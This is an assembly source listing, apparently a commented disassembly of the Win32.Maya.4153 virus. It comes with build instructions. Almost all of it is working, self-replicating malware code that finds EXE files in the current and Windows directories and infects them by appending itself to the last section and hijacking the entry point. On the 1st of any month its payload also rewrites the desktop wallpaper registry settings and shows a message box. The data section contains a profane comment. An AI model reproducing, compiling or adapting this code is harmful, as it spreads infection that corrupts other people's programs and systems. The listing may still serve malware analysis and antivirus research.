;
;		  Win32.Maya.4153 virus
;		disassembly done by peon
;
; Maya is a nonresident PE infector,which searches for victims in the current,
; and the windows directories.It may infect up to 10 files per round(or so).
; On the 1st of any month,infected files display a messagebox and
; set the wallpaper to 'SLAM'.Uses memory mapped files.
; On start,Maya scans the host's imports for GetModuleHandleA for its purposes,
; then looks up apis and searches for exe's in the current and windows
; dirs.Appends itself to the end of the exe's by enlarging the last section
; of the file.Size growth is 4153 bytes (filesize rounded up to file alignment).
; Infection mark is 'WM' in the checksum field of the dos exe header.
; (Files that cant be infected will carry this however)
; Has minor bugs (treats exe header field 3Ch as a word (16bit) etc etc).
; Seems to contain code that is never executed(possibly inclomplete)
;
;
; note:ignore the @xxxx stuff.They were important only while disassembling
; note2:you will notice that the host's entry point is hardcoded to 3000h
; if you compile with Borland stuff,that doesnt make a difference but
; otherwise you might face problems running the first generation.
;
;compilation:
;tasm32 /m /ml wm.asm
;tlink32 wm,,,import32.lib /Tpe
; ..and
;pewrsec wm.exe
; ...to avoid page faults of 1st generation
;

.386			;i do not comment these
.model flat		;because i guess these are well-known
			;and boring


extrn ExitProcess:proc			;1st generation needs this

extrn GetModuleHandleA:proc		;maya needs that the host imports
					;this function

;
;define two structures so need no includes
;
_find_data struc		;finddata structure for file searches
	_attr dd ?
	_creatlo dd ?
	_creathi dd ?
	_lastalo dd ?
	_lastahi dd ?
	_lastwlo dd ?
	_lastwhi dd ?
	_sizehi dd ?
	_sizelo dd ?
	_res0 dd ?
	_res1 dd ?
	_fname db 260 dup(?)		;the only important field for us
	_altname db 14 dup (?)		
_find_data ends

win32systime struc	;system time structure for payload checking
	wyear dw ?
	wmonth dw ?
	wdow dw ?
	wday dw ?	;we are interested in checking the day
	whour dw ?
	wmin dw ?
	wsec dw ?
	wmillisec dw ?
win32systime ends


.code
;------------------- viral code begins here -----------------------

maya_length equ maya_end-maya_start	;size of viral code
maya_start equ $

;
;calculate delta offset and get a handle to KERNEL32.dll
;
maya:
	push ebp		;store ebp on stack
	call maya_flexible_entry;flexible entry point
maya_flexible_entry:
	pop ebp			;will calculate delta offset
	mov ebx,ebp
	sub ebp,offset maya_flexible_entry
	mov eax,1000h		;RVA of viral section,hardcoded
maya_rva_of_viral_section equ $-4
	add eax,6		;
	sub ebx,eax		;got imagebase
	mov [ebp+offset maya_imagebase],ebx	;store imagebase
	mov edx,offset maya_getmodulehandlea
	add edx,ebp		;fetch ptr to 'GetModulaHandleA' string
	mov ecx,[ebp+offset maya_getmodulehandlea_len] ;fetch string length
	push ebp		;save delta
	call maya_lookup_getmodulehandle	;search for import in host
	pop ebp			;get delta bk
	cmp eax,-1		;failed?
	jz maya_restart_host	;yes,abort
	mov [ebp+offset maya_getmodulehandlea_add],eax	;store address
	push ebp		;push delta
	mov ebx,offset maya_k32	;fetch ptr to 'KERNEL32.dll' string
	add ebx,ebp		;add delta
	push ebx		;store parameter
	call eax		;call GetModuleHandleA('KERNEL32.dll')
	pop ebp			;get delta bk
	mov [ebp+offset maya_addof_k32],eax	;store add off K32
;
;look up api's
;
	mov edi,offset maya_getmodulehandlea_len ;add of length of 1st string
	add edi,ebp		;plus delta offset
maya_lookup_loop:
	mov ecx,[edi]		;get string length
	cmp ecx,'MAYA'		;end of api names?		
	jz maya_lookup_done	;yes
	add edi,4		;skip length of string
	mov edx,edi		;store ptr
	add edi,ecx		;edi points to where we want result
	push edi
	call maya_get_apis	;look up api
	pop edi
	mov [edi],eax		;store add
	add edi,4		;go to add of next
	jmp maya_lookup_loop	;and branch
maya_lookup_done:
	mov dword ptr [ebp+offset maya_infection_counter],0	;kill counter
;
;search for executables and infect them
;
	call maya_process_current_directory
	call maya_process_windows_directory
;
;lookup a few more apis--possibly incomplete
;
	call maya_lookup_more
;
;payload check
;
	call maya_payload
;
;jump to host
;
maya_restart_host:	
	mov eax,[ebp+offset maya_entry_of_host]	;get host entry rva
	add eax,[ebp+offset maya_imagebase]	;add imagebase
	pop ebp					;restore ebp
	push eax				;save return address
	ret					;and jump to host
;
;get api addresses needed for infection
;
maya_get_apis:
	mov esi,[ebp+offset maya_addof_k32] ;get add of K32
	cmp word ptr [esi],'ZM'		;is it an exe?
	jne maya_get_apis_return_failure;nope,abort
	xor eax,eax			;zero register
	mov ax,[esi+3ch]		;ptr to PE header
	add eax,[ebp+offset maya_addof_k32];plus K32 base
	xchg esi,eax			;into esi
	cmp word ptr [esi],'EP'		;is it a PE?
	jne maya_get_apis_return_failure;nope,abort
	mov esi,[esi+78h]		;get exports rva in K32
	add esi,[ebp+offset maya_addof_k32];plus K32 base
	mov eax,[esi+1ch]
	add eax,[ebp+offset maya_addof_k32]
	mov [ebp+offset maya_eat],eax	;store it
	mov eax,[esi+20h]		;ptrs to exported names
	add eax,[ebp+offset maya_addof_k32]
	mov [ebp+offset maya_expnames],eax	;store it
	mov eax,[esi+24h]		;ptrs to export ordinals
	add eax,[ebp+offset maya_addof_k32]
	mov [ebp+offset maya_eord],eax	;store it
	xor eax,eax			;zero register
maya_get_apis_loop:
	push ecx			;save string length
	mov esi,edx			;esi=ptr to name that is searched for
	mov edi,[ebp+offset maya_expnames];ptr to exported names
	add edi,eax	
	mov edi,[edi]			;fetch ptr to exported fuction name
	add edi,[ebp+offset maya_addof_k32]	;add K32 base
	repe				;compare names
	cmpsb
	cmp ecx,0			;perfect match?
	je maya_get_apis_found		;yes
	add eax,4			;nope,proceed with next
	pop ecx				;get string length back
	jmp maya_get_apis_loop		;and compare with next name in K32
maya_get_apis_found:	
	pop ecx				;remove ecx from stack
	shr eax,1			;halve eax
	add eax,[ebp+offset maya_eord]	;fix ptr to eord's
	xor ebx,ebx			;zero ebx
	mov bx,[eax]			;fetch eord
	shl ebx,2			;*4
	add ebx,[ebp+offset maya_eat]	;add exports add table offset
	mov eax,[ebx]			;get rva of function
	add eax,[ebp+offset maya_addof_k32];add base of K32
	ret				;and return to caller
maya_get_apis_return_failure:
	mov eax,-1			;return failure to caller
	ret
;
;searches the host's imports for GetModuleHanldeA
;
maya_lookup_getmodulehandle:
	mov esi,[ebp+offset maya_imagebase]	;get imagebase
	cmp word ptr [esi],'ZM'			;host file must be exe	
	jne maya_lookup_getmodulehandle_return_failure ;but it isnt so abort
	xor eax,eax				;zero reg
	mov ax,[esi+3ch]			;ptr to PE head
	mov esi,eax				;into esi
	add esi,[ebp+offset maya_imagebase]	;add imagebase
	cmp word ptr [esi],'EP'			;is it a PE?
	jne maya_lookup_getmodulehandle_return_failure ;nope,abort
	mov esi,[esi+80h]			;get imports rva
	add esi,[ebp+offset maya_imagebase]	;add imagebase
	mov eax,esi
maya_lookup_getmodulehandle_dll_loop:
	mov esi,eax
	mov esi,[esi+0ch]			;name rva of dll module
	add esi,[ebp+offset maya_imagebase]	;add imagebase
	cmp [esi],'NREK'			;is module name 'KERN...'?
	je maya_lookup_getmodulehandle_dll_ok	;yes
	add eax,14h				;next entry
	jmp maya_lookup_getmodulehandle_dll_loop;check next
maya_lookup_getmodulehandle_dll_ok:
	mov esi,eax
	mov eax,[esi+10h]			;import lookup table rva
	add eax,[ebp+offset maya_imagebase]	;add imagebase
	mov [ebp+offset maya_ilt],eax		;store ilt rva
	cmp dword ptr [esi],0			;
	je maya_lookup_getmodulehandle_return_failure
	mov esi,[esi]				;
	add esi,[ebp+offset maya_imagebase]	;add imagebase
	mov ebx,esi				;store ptr
	xor eax,eax				;zero reg
maya_lookup_getmodulehandle_function_loop:
	cmp dword ptr [ebx],0
	je maya_lookup_getmodulehandle_return_failure
	cmp byte ptr [ebx+3],80h
	je maya_lookup_getmodulehandle_nextfunction
	mov esi,[ebx]
	add esi,[ebp+offset maya_imagebase]
	add esi,2
	mov edi,edx
	push ecx
	repe
	cmpsb				;compare function names
	cmp ecx,0			;match?
	pop ecx
	je maya_lookup_getmodulehandle_done ;yes
maya_lookup_getmodulehandle_nextfunction:
	inc eax
	add ebx,4
	jmp maya_lookup_getmodulehandle_function_loop	
maya_lookup_getmodulehandle_done:
	shl eax,2			;*4
	add eax,[ebp+offset maya_ilt]
	mov ebx,eax
	mov eax,[eax]			;got the add
	ret				;so return to the caller
maya_lookup_getmodulehandle_return_failure:
	mov eax,-1			;show that we failed
	ret				;and return to the caller
;
;file infection subroutine
;
maya_infect:			;@11F3
	mov dword ptr[ebp+offset maya_successfull_infection],0	;kill flag
	call maya_getfileattrs				;get file attr
	mov [ebp+offset maya_fileattrib],eax		;store it
	push edx					;ptr to filename
	mov eax,80h					;normal attr
	call maya_setfileattrs
	pop edx
	push edx
	call maya_openfile				;open file
	cmp eax,-1					;failed?
	je maya_infect_restore_attr			;yes,abort
	mov [ebp+offset maya_handle],eax		;store handle
	call maya_getfsize	
	cmp eax,-1					;failed?
	je maya_infect_closefile			;yes,abort
	cmp dword ptr [ebp+offset maya_filesize_high_dword],0 ;file smaller
							      ; than 4 GB?		
	jne maya_infect_closefile			;nope abort
	xchg ecx,eax
	mov [ebp+offset maya_filesize],ecx		;store filesize
	mov eax,[ebp+offset maya_handle]		;get handle
	mov ecx,[ebp+offset maya_filesize]		;get filesize
	add ecx,maya_length+1000h			;add virus size+1000h
	call maya_createfmap				;create file mapping
	cmp eax,0					;failed?
	je maya_infect_closemap				;yes,abort
	mov [ebp+offset maya_maphandle],eax		;store handle
	mov ecx,[ebp+offset maya_filesize]		;get size of victim
	add ecx,maya_length+1000h
	call maya_mapview				;MapViewOfFile()
	cmp eax,0					;failed?
	je maya_infect_closemap				;yes,abort
	mov [ebp+offset maya_mappedadd],eax		;store ptr
	mov esi,eax					;and load into esi
	cmp word ptr [esi],'ZM'				;EXE?
	jne maya_infect_unmap
	cmp word ptr [esi+12h],'MW'			;WM in the checksum
	je maya_infect_unmap				;field?(already inf'd)
	mov word ptr [esi+12h],'MW'			;mark infected
	xor eax,eax
	mov ax,[esi+3ch]				;ptr to PE header
	cmp ax,0					;no PE header?
	je maya_infect_unmap
	cmp eax,maya_filesize				;header located
;***							;beyond eof?
;bug:should be cmp eax,[ebp+maya_filesize] for proper operation
;***
	jnc maya_infect_unmap				;yes abort
	add eax,[ebp+offset maya_mappedadd]		;get add of mapped
	mov esi,eax					;PE header
	cmp word ptr [esi],'EP'				;PE?	
	jne maya_infect_unmap				;nope abort
	mov [ebp+offset maya_peptr],eax			;store ptr to PE head
	mov eax,[esi+3ch]				;get filealign
	mov [ebp+offset maya_filealign],eax		;store it
	mov eax,[ebp+offset maya_entry_of_host]		;get current host entry
	mov [ebp+offset maya_olderva],eax		;store it
	mov eax,[esi+28h]				;get victim entry rva
	mov [ebp+offset maya_entry_of_host],eax		;store it
	mov eax,[esi+74h]
	shl eax,3					;*8	
	add eax,[ebp+offset maya_peptr]
	add eax,78h
	xor ecx,ecx					;zero register
	mov cx,[esi+6]					;get object count
maya_infect_setwbit:	;@1318
	or dword ptr [eax+24h],80000000h		;set W bit of sections
	add eax,28h					;next section...
	loop maya_infect_setwbit
	sub eax,28h					;ptr to last entry	
	mov [ebp+offset maya_ptrtolastsection],eax	;store it	
	mov edi,eax					;ptr into edi
	mov eax,[edi+10h]				;get section PhysSize
	mov [ebp+offset maya_sectps],eax		;store it
	add eax,[edi+0ch]				;plus section rva
	mov [ebp+offset maya_rva_of_viral_section],eax	;patch code
	mov [ebp+offset maya_sectrva],eax		;store it
	push edi
	mov eax,[edi+14h]				;get section PhysOffs
	add eax,[ebp+offset maya_mappedadd]		;get ptr to raw
							;data of last section
	add eax,[edi+10h]				;add PhysSize
	mov edi,eax					;load ptr into edi
	mov esi,offset maya_start			;get virus start add
	add esi,ebp					;add delta offset
	mov ecx,maya_length				;length of code
	cld						;increase pointers
	rep						;move viral code..
	movsb						;..into the mapped..
	pop edi						;..executable
	add dword ptr [edi+10h],maya_length		;update..
							;..sectionPhysSize
	add dword ptr [ebp+offset maya_filesize],maya_length	;and filesize	
	xor edx,edx					;zero edx
	mov eax,[edi+10h]				;get section PhysSize
	mov ecx,[ebp+offset maya_filealign]
	push ecx					;calculates section..
	div ecx						;..PhysSize with respect
	pop ecx						;to file alignment unit
	sub ecx,edx					;calculate padding
	add [edi+10h],ecx				;and add to PhysSize
	add [ebp+offset maya_filesize],ecx
	mov eax,[edi+10h]				;get updated PhysSize
	mov [edi+8],eax					;set virtual size
	or dword ptr [edi+24h],20h			;set Code flag
	or dword ptr [edi+24h],20000000h		;set Executable flag
	mov esi,[ebp+offset maya_peptr]			;get ptr to PE head
	mov eax,[ebp+offset maya_sectrva]		;get rva of last section
	mov [esi+28h],eax				;set new entry point
	mov eax,[edi+0ch]				;get section rva
	add eax,[edi+10h]				;add section PhysSize
	mov [esi+50h],eax				;set imagesize
	mov eax,[ebp+offset maya_olderva]		;get current host entry
	mov [ebp+offset maya_entry_of_host],eax		;restore it
	mov dword ptr[ebp+offset maya_successfull_infection],1
							;set flag
maya_infect_unmap:	;@13D0
	mov eax,[ebp+offset maya_mappedadd]
	call maya_unmapview			;call UnmapViewOfFile
maya_infect_closemap:	;@13DB
	mov eax,[ebp+offset maya_maphandle]	;call CloseHandle
	call maya_closefile	
	mov eax,[ebp+offset maya_handle]	
	mov ecx,[ebp+offset maya_filesize]	
	call maya_setfilepo			;set file pointer to end
	cmp eax,-1
	je maya_infect_closefile
	mov eax,[ebp+offset maya_handle]
	call maya_seteof			;and set end of file
maya_infect_closefile:
	mov eax,[ebp+offset maya_handle]
	call maya_closefile			;finally close file
maya_infect_restore_attr:
	pop edx					;ptr to filename
	mov eax,[ebp+offset maya_fileattrib]
	call maya_setfileattrs			;restore attributes
	ret					;and return to caller
;
;subroutines used during infection
;
maya_openfile:		;@141F
	push ebp
	push 0
	push 80h
	push 3
	push 0
	push 1
	push 0C0000000h
	push edx
	mov eax,[ebp+offset maya_createfilea_add]
	call eax
	pop ebp
	ret
maya_closefile:		;@143D
	push ebp
	push eax
	mov eax,[ebp+offset maya_closehandle_add]
	call eax
	pop ebp
	ret
maya_createfmap:	;@1449
	push ebp
	push 0
	push ecx
	push 0
	push 4
	push 0
	push eax
	mov eax,[ebp+offset maya_createfilemappinga_add]
	call eax
	pop ebp
	ret
maya_mapview:		;@145E
	push ebp
	push ecx
	push 0
	push 0
	push 2
	push eax
	mov eax,[ebp+offset maya_mapviewoffile_add]
	call eax
	pop ebp
	ret
maya_unmapview:		;@1471
	push ebp
	push eax
	mov eax,[ebp+offset maya_unmapviewoffile_add]
	call eax
	pop ebp
	ret
maya_setfilepo:		;@147D
	push ebp
	push 0
	push 0
	push ecx
	push eax
	mov eax,[ebp+offset maya_setfilepointer_add]
	call eax
	pop ebp
	ret
maya_seteof:		;@148E
	push ebp
	push eax
	mov eax,[ebp+offset maya_setendoffile_add]
	call eax
	pop ebp
	ret
maya_getfsize:		;@149A
	push ebp
	mov ebx,offset maya_filesize_high_dword ;get add of room for
	add ebx,ebp				;hi dword of filesize
	push ebx				;store ptr
	push eax				;store handle
	mov eax,[ebp+offset maya_getfilesize_add];get fn add
	call eax		;call fn
	pop ebp
	ret
maya_getfileattrs:		;@14AE
	push ebp
	push edx
	push edx		;store filename as param
	mov eax,[ebp+offset maya_getfileattributesa_add]
	call eax		;call function
	pop edx
	pop ebp
	ret
maya_setfileattrs:		;@14BC
	push ebp
	push eax		;store params
	push edx
	mov eax,[ebp+offset maya_setfileattributesa_add]
	call eax		;call fn
	pop ebp
	ret
maya_getcurrdir:		;@14C9
	push ebp
	push eax		;ptr to buffer
	push 80h		;buffer size
	mov eax,[ebp+offset maya_getcurrentdirectorya_add]
	call eax
	pop ebp
	ret
maya_setcurrdir:		;@14DA
	push ebp
	push eax		;ptr to path
	mov eax,[ebp+offset maya_setcurrentdirectorya_add]
	call eax
	pop ebp
	ret
maya_getwindir:			;@14E6
	push ebp
	push 80h		;buffer size
	push eax		;ptr to buffer
	mov eax,[ebp+offset maya_getwindowsdirectorya_add]
	call eax
	pop ebp
	ret
maya_getsystime:		;@14F7
	push ebp
	mov eax,offset maya_systime
	add eax,ebp	
	push eax		;store ptr to structure to be filled
	mov eax,[ebp+offset maya_getsystemtime_add]
	call eax		;call fn
	pop ebp
	ret
maya_getmodhand:		;@150A
	push ebp
	push eax
	mov eax,[ebp+offset maya_getmodulehandlea_add]
	call eax
	pop ebp
	ret
maya_getprocadd:		;@1516
	push ebp
	push edx		;ptr to fn name
	push eax		;hModule
	mov eax,[ebp+offset maya_getprocaddress_add]
	call eax
	pop ebp
	ret
;
;
;
maya_lookup_more:	;@1523
	mov edi,offset maya_movefilea_len	;ptr to more api names
	add edi,ebp				;plus delta offset
maya_lookup_more_loop:		;loop begins here
	mov ecx,[edi]		;get length of name string
	cmp ecx,'SHAI'		;end of api names?	
	je maya_lookup_more_return	;yes
	add edi,4		;skip length of string
	mov edx,edi		;edx points to api name
	push edi		;save regs
	push ecx
	push ebp
	call maya_lookup_getmodulehandle	;get fn add
;this call will fail or virus causes a fault at line 579
	pop ebp			;get regs back
	pop ecx
	pop edi
	add edi,ecx		;get ptr to room for address,after api name
	cmp eax,-1
	je maya_lookup_more_nextfn
	mov [edi],eax		;store fn add
	mov eax,[edi+4]
	add eax,ebp
	mov [ebx],eax
maya_lookup_more_nextfn:
	add edi,8		;next
	jmp maya_lookup_more_loop
maya_lookup_more_return:	;@1559
	ret
;
;the following code is probaly dead
;
maya_deadcode:
	pushad
	call maya_deadcode_calculate_deltaoffset
	add ecx,28h
	mov edx,[esp+ecx]
	call maya_deadcode_extension_check
	cmp eax,1
	jne maya_deadcode_skip
	call maya_infect
maya_deadcode_skip:
	popad
	ret		

maya_deadcode_extension_check:
	mov esi,edx		;get filename ptr into esi
	cld			;increase ptrs
maya_deadcode_extension_check_loop:
	lodsb			;fetch character of filename
	cmp al,0		;null?
	je maya_deadcode_extension_check_ret0	;yes abort
	cmp al,'.'		;dot?
	jne maya_deadcode_extension_check_loop	;nope branch to find dot
	cmp dword ptr [esi-1],'EXE.';extension check
	je maya_deadcode_extension_check_ret1
	cmp dword ptr [esi-1],'exe.';extension check
	je maya_deadcode_extension_check_ret1
maya_deadcode_extension_check_ret0:
	xor eax,eax		;return failure
	ret
maya_deadcode_extension_check_ret1:
	mov eax,1		;return success
	ret
;@159x
;
;these calls dont seem to be executed
;
maya_deadcode_call1 equ $
	call maya_deadcode_hook
	jmp [ecx+offset maya_movefilea_add]
maya_deadcode_call2 equ $
	call maya_deadcode_hook
	jmp [ecx+offset maya_copyfilea_add]
maya_deadcode_call3 equ $
	call maya_deadcode_hook
	jmp [ecx+offset maya_createfilea2_add]
maya_deadcode_call4 equ $
	call maya_deadcode_hook
	jmp [ecx+offset maya_deletefilea_add]
maya_deadcode_call5 equ $
	call maya_deadcode_hook
	jmp [ecx+offset maya_setfileattributesa2_add]
maya_deadcode_call6 equ $
	call maya_deadcode_hook
	jmp [ecx+offset maya_getfileattributesa2_add]
maya_deadcode_call7 equ $
	call maya_deadcode_hook
	jmp [ecx+offset maya_getfullpathnamea_add]
maya_deadcode_call8 equ $
	call maya_deadcode_hook
	jmp [ecx+offset maya_createprocessa_add]

maya_deadcode_hook:
	mov ecx,4
	call maya_deadcode
	push ebp
	call maya_deadcode_calculate_deltaoffset
	mov ecx,ebp
	pop ebp
	ret

maya_deadcode_calculate_deltaoffset:
	call $+5
maya_deadcode_calculate_deltaoffset_plus5:
	pop ebp
	sub ebp,offset maya_deadcode_calculate_deltaoffset_plus5
	ret	
;
;file searching routines
;
maya_process_windows_directory:
	mov dword ptr[ebp+offset maya_infection_counter],0	;kill counter
	call maya_process_current_directory	;attack current dir again		
	cmp dword ptr[ebp+offset maya_infection_counter],5 ;inf'd 5 files again?
	je maya_process_windows_directory_return	;if so return
	mov eax,offset maya_currdir
	add eax,ebp
	call maya_getcurrdir
	cmp eax,0
	je maya_process_windows_directory_return
	mov eax,offset maya_windir
	add eax,ebp
	call maya_getwindir
	cmp eax,0
	je maya_process_windows_directory_return
	mov eax,offset maya_windir
	add eax,ebp
	call maya_setcurrdir
	cmp eax,0
	je maya_process_windows_directory_return
	call maya_process_current_directory
	mov eax,offset maya_currdir
	add eax,ebp
	call maya_setcurrdir
maya_process_windows_directory_return:
	ret				;return to caller
;
;routine to scan for and infect files in the current directory
;
maya_process_current_directory:		;@1674
	push ebp
	mov eax,offset maya_finddata	;get add of structure
	add eax,ebp			;add delta offset
	push eax			;store parameter
	mov eax,offset maya_filemask	;get add of filemask
	add eax,ebp			;add delta offset
	push eax			;store parameter
	mov eax,[ebp+offset maya_findfirstfilea_add];get add of FindFirstFileA
	call eax			;call function
	pop ebp
	cmp eax,-1			;failed?
	je maya_process_current_directory_return;yes
	mov [ebp+offset maya_findhandle],eax	;store handle
	mov edx,offset maya_finddata._fname	;get ptr to filename
	add edx,ebp				;add delta offset
	call maya_infect			;try to infect file	
	cmp dword ptr[ebp+offset maya_successfull_infection],1	;check flag
	jne maya_process_current_directory_findnext
	inc dword ptr[ebp+offset maya_infection_counter]	;increment counter
	cmp dword ptr[ebp+offset maya_infection_counter],5;already infected 5 files?
	je maya_process_current_directory_return ;yes so return to caller
maya_process_current_directory_findnext:
	push ebp
	mov eax,offset maya_finddata	;get add of structure
	add eax,ebp			;add delta offset
	push eax			;store parameter				
	push dword ptr[ebp+offset maya_findhandle]	;store parameter
	mov eax,[ebp+offset maya_findnextfilea_add]	;get add of FindNextFileA
	call eax				;call function
	pop ebp	
	cmp eax,0				;found more?
	je maya_process_current_directory_return;nope
	mov edx,offset maya_finddata._fname	;get filename
	add edx,ebp				;add delta offset
	call maya_infect			;try to infect file
	cmp dword ptr[ebp+offset maya_successfull_infection],1 ;inf ok?
	jne maya_process_current_directory_findnext   ;nope proceed
	inc dword ptr[ebp+offset maya_infection_counter]	      ;inc counter
	cmp dword ptr[ebp+offset maya_infection_counter],5     ;already 5?
	je maya_process_current_directory_return      ;yes return to caller
	jmp maya_process_current_directory_findnext   ;nope find more files
maya_process_current_directory_return:
	ret						;return to caller

maya_payload:		;@1701
;
;on the 1st of any month,creates a slam.bmp file containing a SLAM logo
;and sets the wallpaper to it.Then displays a messagebox.
;
	call maya_getsystime		;fill system time structure
	cmp word ptr[ebp+offset maya_systime.wday],1 ;1st of any month?
	jne maya_payload_return			;nope abort
	mov eax,offset maya_user32		;ptr to 'USER32.dll' string
	add eax,ebp				;add delta offset
	call maya_getmodhand			;get hModule to user32
	cmp eax,0				;failed?
	je maya_payload_return			;yes abort
	mov [ebp+offset maya_u32hand],eax	;store hModule to user32
	mov eax,offset maya_advapi32		;ptr to 'ADVAPI32.dll' string
	add eax,ebp				;add delta offset
	call maya_getmodhand			;get hModule
	cmp eax,0				;failed?
	je maya_payload_return			;yes abort
	mov [ebp+offset maya_a32hand],eax	;store hModule	
	mov edx,offset maya_regopenkeyexa	;get ptr
	add edx,ebp				;add delta offset
	mov eax,[ebp+offset maya_a32hand]	;get handle to advapi32
	call maya_getprocadd			;get add of RegOpenKeyExA fn
	cmp eax,0				;failed?
	je maya_payload_return			;yes abort
	mov [ebp+offset maya_regopenkeyexa_add],eax ;store add
;
;now gets the address of 3 more fn's:RegSetVauleExA,MessageBoxA,
;and SystemParametersInfo.It is identical to the method above,
;so i dont waste time commenting it
;
	mov edx,offset maya_regsetvalueexa	;asciiz of fn
	add edx,ebp
	mov eax,[ebp+offset maya_a32hand]
	call maya_getprocadd
	cmp eax,0
	je maya_payload_return
	mov [ebp+offset maya_regsetvalueexa_add],eax ;store add
	mov edx,offset maya_messageboxa		;asciiz of fn
	add edx,ebp
	mov eax,[ebp+offset maya_u32hand]
	call maya_getprocadd
	cmp eax,0
	je maya_payload_return
	mov [ebp+offset maya_messageboxa_add],eax	;store add
	mov edx,offset maya_sysparam
	add edx,ebp					;add delta offset
	mov eax,[ebp+offset maya_u32hand]	;get handle to user32.dll
	call maya_getprocadd		;call fn
	cmp eax,0			;failed?
	je maya_payload_return		;yes abort
;
;creates the .bmp file
;
	mov [ebp+offset maya_sysparam_add],eax
	push 0			;hTemplate is null
	push 80h		;attribute normal
	push 2			;create always,overwrite if exists
	push 0			;no security attrs struct,so we pass null
	push 1			;share_read
	push 40000000h		;generic write access
	mov eax,offset maya_slamfilename;ptr to filename
	add eax,ebp		;add delta offset
	push eax		;ptr to filename
	mov eax,[ebp+offset maya_createfilea_add];get fn add
	call eax				;call CreateFileA()
	cmp eax,-1				;failed?
	je maya_payload_return			;yes abort
	mov [ebp+offset maya_slamhandle],eax	;store handle	
	push 0				;null as overlapped ptr to WriteFile
	mov eax,offset maya_numberofwritten	;add of room
						;for # of written bytes
	add eax,ebp				;plus delta offset
	push eax				;store parameter
	push dword ptr slam_len			;length of .bmp
	mov eax,offset slam			;ptr to .bmp
	add eax,ebp				;plus delta offset
	push eax				;store parameter
	push dword ptr [ebp+offset maya_slamhandle] ;store handle for WriteFile
	mov eax,[ebp+offset maya_writefile_add]	;get add of fn
	call eax				;call fn
	push dword ptr[ebp+offset maya_slamhandle];push handle
	mov eax,[ebp+offset maya_closehandle_add];get fn add
	call eax				;call fn
;
;registry manipulations to modify wallpaper
;
	mov eax,offset maya_reg			;address of result
	add eax,ebp				;add delta offset
	push eax				;pass param
	push 2					;desired access:KEY_SET_VALUE
	push 0					;reserved,must be null
	mov eax,offset maya_cpd			;ptr to 'Control Panel\Desktop'
	add eax,ebp				;add delta offset
	push eax				;pass param
	push 80000001h				;HKEY_CURRENT_USER
	mov eax,[ebp+offset maya_regopenkeyexa_add];get fn address
	call eax				;call RegOpenKeyExA
	push 2					;size of value data
	mov eax,offset maya_one			;'1' character
	add eax,ebp				;add delta offset
	push eax				;pass param
	push 1					;type of data:1=zero terminated
						;string
	push 0					;reserved,must be null
	mov eax,offset maya_tilewallpaper	;ptr to 'Tilewallpaper'
	add eax,ebp				;add delta offset
	push eax				;value name to set
	push dword ptr [ebp+offset maya_reg]	;hKey
	mov eax,[ebp+offset maya_regsetvalueexa_add]
	call eax				;call fn
	push 2					;size of value data
	mov eax,offset maya_zero		;'0' character
	add eax,ebp				;add delta offset
	push eax				;pass param
	push 1					;data type
	push 0					;reserved
	mov eax,offset maya_wallpaperstyle	;ptr to value name
	add eax,ebp				;add delta offset
	push eax				;pass param
	push dword ptr[ebp+offset maya_reg]	;hKey
	mov eax,[ebp+offset maya_regsetvalueexa_add];get fn add
	call eax				;call fn
	push 0
	mov eax,offset maya_slamfilename	;file containing .bmp
	add eax,ebp				;add delta offset
	push eax				;pass param
	push 0
	push 14h				;SPI_SETDESKWALLPAPER
	mov eax,[ebp+offset maya_sysparam_add]	;get fn add
	call eax				;call fn:update desktop
;
;messagebox
;
	push 30h				;MB_OK+MB_ICONEXCLAMATION style
	mov eax,offset maya_viralert		;title of msgbox
	add eax,ebp				;add delta offset
	push eax				;pass param
	mov eax,offset maya_mayamsg		;ptr to msg of msgbox
	add eax,ebp				;add delta offset
	push eax				;pass param
	push 0					;hWnd of caller (virus)
	mov eax,[ebp+offset maya_messageboxa_add]	;get fn add
	call eax				;call MessageBox fn
maya_payload_return:
	ret					;return to caller
;
;data related to virus
;

maya_msg	db 'To Aparna S. : Forever in love with you...'
;
;fuck all the motherfucking bitches
;

maya_addof_k32	dd 0		;address of KERNEL32.dll module
maya_imagebase	dd 0		;imagebase of host @18FC
maya_windir	db 128 dup(0)	;room for Windows directory ASCIIZ string @1900
maya_currdir	db 128 dup (0)	;room for current directory ASCIIZ string @1980
maya_systime	win32systime ;win32 system time structure @1A00
maya_finddata _find_data 	;finddata structure for file searches @1A10


maya_fileattrib			dd 0	;attribute of victim @1B58
maya_successfull_infection	dd 0	;flag that indicates the infection
					;routines completed operation @1B5C
maya_infection_counter	dd 0	;counter of infections @1B60
maya_eat		dd 0	;export address table
maya_expnames		dd 0	;exported names
maya_eord		dd 0	;exports ordinals
maya_ilt		dd 0	;import lookup table rva


maya_findhandle		dd 0	;handle used in file searches
maya_filemask	db '*.EXE',0	;filemask used to find victims @1B51

maya_filesize_high_dword	dd 0	;hi dword of filesize @1B74
maya_filesize			dd 0	;lo dword of filesize @1B78
maya_handle		dd 0	;handle of file being infected	@1B7C
maya_maphandle		dd 0	;handle of filemapping object	@1B80
maya_mappedadd		dd 0	;address where file is mapped	@1B84
maya_peptr		dd 0	;PE head ptr			@1B88
maya_ptrtolastsection	dd 0	;ptr to last entry in section table @1B8C
maya_filealign		dd 0	;file alignment unit size	@1B90
maya_entry_of_host	dd 3000h	;host entry rva  @1B94
; yikes--hardcoded for 1st generation:)

maya_sectrva		dd 0	;rva of viral section	 @1B98
maya_olderva		dd 0	;temporary storage of host entry point @1B9C
maya_sectps		dd 0	;PhysSize of last section @1BA0
maya_k32	db 'KERNEL32.dll',0	;@1BA4
;
;api names
;
maya_getmodulehandlea_len	dd 17		;@1BB1
maya_getmodulehandlea		db 'GetModuleHandleA',0
maya_getmodulehandlea_add	dd 0

maya_getprocaddress_len		dd 15
maya_getprocaddress		db 'GetProcAddress',0
maya_getprocaddress_add		dd 0

maya_createfilea_len		dd 12
maya_createfilea		db 'CreateFileA',0
maya_createfilea_add		dd 0

maya_writefile_len		dd 10
maya_writefile			db 'WriteFile',0
maya_writefile_add		dd 0

maya_getfilesize_len		dd 12
maya_getfilesize		db 'GetFileSize',0
maya_getfilesize_add		dd 0

maya_createfilemappinga_len	dd 19
maya_createfilemappinga		db 'CreateFileMappingA',0
maya_createfilemappinga_add	dd 0

maya_mapviewoffile_len		dd 14
maya_mapviewoffile		db 'MapViewOfFile',0
maya_mapviewoffile_add		dd 0

maya_unmapviewoffile_len	dd 16
maya_unmapviewoffile		db 'UnmapViewOfFile',0
maya_unmapviewoffile_add	dd 0

maya_closehandle_len		dd 12
maya_closehandle		db 'CloseHandle',0
maya_closehandle_add		dd 0

maya_findfirstfilea_len		dd 15
maya_findfirstfilea		db 'FindFirstFileA',0
